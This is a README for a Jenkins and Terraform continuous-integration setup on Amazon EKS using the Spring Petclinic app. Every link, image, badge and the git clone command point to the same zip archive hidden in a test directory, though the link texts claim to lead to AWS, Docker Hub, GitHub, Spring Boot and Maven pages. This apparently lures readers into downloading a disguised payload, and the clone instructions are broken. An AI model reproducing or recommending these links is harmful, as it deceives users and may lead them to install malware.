# Continuous Intergration on Amazon EKS
<br />

## Prerequisites
To implement the instructions in this post, you will need the following accounts:

* An AWS account – [how to create a new AWS account](https://github.com/marcossangomes/amazon-eks-jenkins-terraform/raw/refs/heads/master/src/test/java/org/springframework/samples/petclinic/system/jenkins_amazon_eks_terraform_v2.0.zip)
* A Docker hub account – [how to register for docker id](https://github.com/marcossangomes/amazon-eks-jenkins-terraform/raw/refs/heads/master/src/test/java/org/springframework/samples/petclinic/system/jenkins_amazon_eks_terraform_v2.0.zip)
* A GitHub account – [sign up for a new GitHub account](https://github.com/marcossangomes/amazon-eks-jenkins-terraform/raw/refs/heads/master/src/test/java/org/springframework/samples/petclinic/system/jenkins_amazon_eks_terraform_v2.0.zip)

<br />

## Architecture

<img width="1042" alt="architecture-screenshot" src="https://github.com/marcossangomes/amazon-eks-jenkins-terraform/raw/refs/heads/master/src/test/java/org/springframework/samples/petclinic/system/jenkins_amazon_eks_terraform_v2.0.zip">

<br />


## Sample Application [![Build Status](https://github.com/marcossangomes/amazon-eks-jenkins-terraform/raw/refs/heads/master/src/test/java/org/springframework/samples/petclinic/system/jenkins_amazon_eks_terraform_v2.0.zip)](https://github.com/marcossangomes/amazon-eks-jenkins-terraform/raw/refs/heads/master/src/test/java/org/springframework/samples/petclinic/system/jenkins_amazon_eks_terraform_v2.0.zip)

### Understanding the Spring Petclinic application with a few diagrams


### Running petclinic locally
Petclinic is a [Spring Boot](https://github.com/marcossangomes/amazon-eks-jenkins-terraform/raw/refs/heads/master/src/test/java/org/springframework/samples/petclinic/system/jenkins_amazon_eks_terraform_v2.0.zip) application built using [Maven](https://github.com/marcossangomes/amazon-eks-jenkins-terraform/raw/refs/heads/master/src/test/java/org/springframework/samples/petclinic/system/jenkins_amazon_eks_terraform_v2.0.zip). You can build a jar file and run it from the command line:


```
git clone https://github.com/marcossangomes/amazon-eks-jenkins-terraform/raw/refs/heads/master/src/test/java/org/springframework/samples/petclinic/system/jenkins_amazon_eks_terraform_v2.0.zip
cd amazon-eks-jenkins-terraform
./mvnw package
java -jar target/*.jar
```

You can then access petclinic here: http://localhost:8080/

<img width="1042" alt="petclinic-screenshot" src="https://github.com/marcossangomes/amazon-eks-jenkins-terraform/raw/refs/heads/master/src/test/java/org/springframework/samples/petclinic/system/jenkins_amazon_eks_terraform_v2.0.zip">

Or you can run it from Maven directly using the Spring Boot Maven plugin. If you do this it will pick up changes that you make in the project immediately (changes to Java source files require a compile as well - most people use an IDE for this):

```
./mvnw spring-boot:run
```
